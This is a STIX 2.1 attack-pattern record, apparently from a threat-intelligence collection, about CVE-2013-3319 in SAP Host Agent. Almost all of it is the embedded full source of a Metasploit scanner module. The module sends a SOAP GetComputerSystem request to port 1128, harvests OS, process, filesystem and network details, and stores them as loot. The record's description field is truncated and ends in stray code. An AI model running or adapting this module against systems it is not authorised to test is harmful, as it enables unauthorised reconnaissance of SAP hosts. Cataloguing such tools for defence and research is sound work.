{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f9cbaf9-1a14-4b27-9367-f2a7c13d6045",
    "created": "2024-08-14T16:27:01.293815Z",
    "modified": "2024-08-14T16:27:01.293819Z",
    "name": "SAP Host Agent Information Disclosure",
    "description": " This module attempts to retrieve Computer and OS info from Host Agent through the SAP HostControl service.  'References' => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem.rb",
            "external_id": "sap_hostctrl_getcomputersystem.rb"
        },
        {
            "source_name": "reference",
            "url": "https://launchpad.support.sap.com/#/notes/1816536"
        },
        {
            "source_name": "reference",
            "url": "https://labs.integrity.pt/advisories/cve-2013-3319/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name' => 'SAP Host Agent Information Disclosure',\n      'Description' => %q{\n        This module attempts to retrieve Computer and OS info from Host Agent\n        through the SAP HostControl service.\n        },\n      'References' =>\n        [\n          # General\n          ['CVE', '2013-3319'],\n          ['OSVDB', '95616'],\n          ['BID', '61402'],\n          ['URL', 'https://launchpad.support.sap.com/#/notes/1816536'],\n          ['URL', 'https://labs.integrity.pt/advisories/cve-2013-3319/']\n        ],\n      'Author' =>\n        [\n          'Bruno Morisson <bm[at]integrity.pt>' # Discovery and msf module\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(1128)\n      ])\n\n    register_autofilter_ports([1128])\n\n\n  end\n\n  def initialize_tables\n\n    @computer_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Remote Computer Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"Names\",\n          \"Hostnames\",\n          \"IPAddresses\"\n        ])\n\n    @os_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Remote OS Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"Name\",\n          \"Type\",\n          \"Version\",\n          \"TotalMemSize\",\n          \"Load Avg 1m\",\n          \"Load Avg 5m\",\n          \"Load Avg 15m\",\n          \"CPUs\",\n          \"CPU User\",\n          \"CPU Sys\",\n          \"CPU Idle\"\n        ])\n    @net_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Network Port Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"ID\",\n          \"PacketsIn\",\n          \"PacketsOut\",\n          \"ErrorsIn\",\n          \"ErrorsOut\",\n          \"Collisions\"\n        ])\n\n    @process_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Remote Process Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"Name\",\n          \"PID\",\n          \"Username\",\n          \"Priority\",\n          \"Size\",\n          \"Pages\",\n          \"CPU\",\n          \"CPU Time\",\n          \"Command\"\n        ])\n\n    @fs_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Remote Filesystem Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"Name\",\n          \"Size\",\n          \"Available\",\n          \"Remote\"\n        ])\n\n    @net_table = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"Network Port Listing\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>\n        [\n          \"ID\",\n          \"PacketsIn\",\n          \"PacketsOut\",\n          \"ErrorsIn\",\n          \"ErrorsOut\",\n          \"Collisions\"\n        ])\n\n  end\n\n  # Parses an array of mProperties elements. For every mProperties element,\n  # if there is an item with mValue ITSAMComputerSystem, then collect the\n  # values for the items with mName in (Name, Hostnames, IPAdresses)\n  def parse_computer_info(data)\n    success = false\n    data.each do |properties|\n      name, hostnames, addresses = \"\"\n\n      if properties.get_elements(\"item//mValue[text()=\\\"ITSAMComputerSystem\\\"]\").empty?\n        next\n      end\n\n      item_list = properties.get_elements(\"item\")\n      item_list.each do |item|\n        item_name = item.get_elements(\"mName\").first.text\n        item_value = item.get_elements(\"mValue\").first.text\n\n        case item_name\n        when \"Name\"\n          name = item_value\n        when \"Hostnames\"\n          hostnames = item_value\n        when \"IPAdresses\"\n          addresses = item_value\n        end\n      end\n\n      @computer_table << [name, hostnames, addresses]\n\n      success = true\n    end\n\n    return success\n  end\n\n  # Get the mValues of every item\n  def parse_values(data, ignore)\n    values = []\n\n    item_list = data.get_elements(\"item\")\n    item_list.each do |item|\n      value_item = item.get_elements(\"mValue\")\n\n      if value_item.empty?\n        value = \"\"\n      else\n        value = value_item.first.text\n      end\n\n      if value == ignore\n        next\n      end\n\n      values << value\n    end\n    return values\n  end\n\n  # Parses an array of mProperties elements and get the interesting info\n  # including ITSAMOperatingSystem, ITSAMOSProcess, ITSAMFileSystem and\n  # ITSAMNetworkPort properties.\n  def parse_detailed_info(data)\n    data.each do |properties|\n      if not properties.get_elements(\"item//mValue[text()=\\\"ITSAMOperatingSystem\\\"]\").empty?\n        values = parse_values(properties, \"ITSAMOperatingSystem\")\n        parse_os_info(values)\n      end\n\n      if not properties.get_elements(\"item//mValue[text()=\\\"ITSAMOSProcess\\\"]\").empty?\n        values = parse_values(properties, \"ITSAMOSProcess\")\n        parse_process_info(values)\n      end\n\n      if not properties.get_elements(\"item//mValue[text()=\\\"ITSAMFileSystem\\\"]\").empty?\n        values = parse_values(properties, \"ITSAMFileSystem\")\n        parse_fs_info(values)\n      end\n\n      if not properties.get_elements(\"item//mValue[text()=\\\"ITSAMNetworkPort\\\"]\").empty?\n        values = parse_values(properties, \"ITSAMNetworkPort\")\n        parse_net_info(values)\n      end\n    end\n  end\n\n  def parse_os_info(os_info)\n    @os_table << [\n      os_info[0],      # OS name\n      os_info[1],      # OS type\n      os_info[2],      # OS Version\n      os_info[7],      # Total Memory\n      os_info[11],     # Load Average (1m)\n      os_info[12],     # Load Average (5m)\n      os_info[13],     # Load Average (15m)\n      os_info[17],     # Number of CPUs / Cores\n      os_info[18]+'%', # CPU usage (User)\n      os_info[19]+'%', # CPU usage (system)\n      os_info[20]+'%'  # CPU idle\n    ]\n  end\n\n  def parse_process_info(process_info)\n    @process_table << [\n      process_info[0],     # Process name\n      process_info[1],     # PID\n      process_info[2],     # Username\n      process_info[3],     # Priority\n      process_info[4],     # Mem size\n      process_info[5],     # pages\n      process_info[6]+'%', # CPU usage\n      process_info[7],     # CPU time\n      process_info[8]      # Command\n    ]\n  end\n\n  def parse_fs_info(fs_info)\n    @fs_table << [\n      fs_info[0],  # Filesystem Name\n      fs_info[2],  # Size\n      fs_info[3],  # Space Available\n      fs_info[6]   # Is the filesystem remote ?\n    ]\n  end\n\n  def parse_net_info(net_info)\n    @net_table << [\n      net_info[0], # Network Device ID\n      net_info[1], # Packets In\n      net_info[2], # Packets Out\n      net_info[3], # Errors In\n      net_info[4], # Errors Out\n      net_info[5]  # Collisions\n    ]\n  end\n\n\n  def run_host(rhost)\n\n    vprint_status(\"#{rhost}:#{rport} - Connecting to SAP Host Control service\")\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"'\n    data << 'xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">'\n    data << '<SOAP-ENV:Header><sapsess:Session xlmns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\">'\n    data << '<enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body>'\n    data << '<ns1:GetComputerSystem xmlns:ns1=\"urn:SAPHostControl\"><aArguments><item>'\n    data << '<mKey>provider</mKey><mValue>saposcol</mValue></item></aArguments></ns1:GetComputerSystem>'\n    data << \"</SOAP-ENV:Body></SOAP-ENV:Envelope>\\r\\n\\r\\n\"\n\n    begin\n\n      res = send_request_raw(\n        {\n          'uri' => \"/\",\n          'method' => 'POST',\n          'data' => data,\n          'headers' => {\n            'Content-Type' => 'text/xml; charset=UTF-8',\n          }\n        })\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Unable to connect to service\")\n      return\n    end\n\n    if res and res.code == 500 and res.body =~ /<faultstring>(.*)<\\/faultstring>/i\n      faultcode = $1.strip\n      vprint_error(\"#{rhost}:#{rport} - Error code: #{faultcode}\")\n      return\n\n    elsif res and res.code != 200\n      vprint_error(\"#{rhost}:#{rport} - Error in response\")\n      return\n    end\n\n    initialize_tables()\n\n    vprint_good(\"#{rhost}:#{rport} - Connected. Retrieving info\")\n\n    begin\n      response_xml = REXML::Document.new(res.body)\n      computer_info = response_xml.elements.to_a(\"//mProperties/\") # Computer info\n      detailed_info = response_xml.elements.to_a(\"//item/mProperties/\") # all other info\n    rescue\n      print_error(\"#{rhost}:#{rport} - Unable to parse XML response\")\n      return\n    end\n\n    success = parse_computer_info(computer_info)\n    if success\n      print_good(\"#{rhost}:#{rport} - Information retrieved successfully\")\n    else\n      print_error(\"#{rhost}:#{rport} - Unable to parse reply\")\n      return\n    end\n\n    # assume that if we can parse the first part, it is a valid SAP XML response\n    parse_detailed_info(detailed_info)\n\n    sap_tables_clean = ''\n\n    [@os_table, @computer_table, @process_table, @fs_table, @net_table].each do |t|\n      sap_tables_clean << t.to_s\n    end\n\n    vprint_good(\"#{rhost}:#{rport} - Information retrieved:\\n\"+sap_tables_clean)\n\n    xml_raw = store_loot(\n      \"sap.getcomputersystem\",\n      \"text/xml\",\n      rhost,\n      res.body,\n      \"sap_getcomputersystem.xml\",\n      \"SAP GetComputerSystem XML\"\n    )\n\n    xml_parsed = store_loot(\n      \"sap.getcomputersystem\",\n      \"text/plain\",\n      rhost,\n      sap_tables_clean,\n      \"sap_getcomputersystem.txt\",\n      \"SAP GetComputerSystem XML\"\n    )\n\n    print_status(\"#{rhost}:#{rport} - Response stored in #{xml_raw} (XML) and #{xml_parsed} (TXT)\")\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}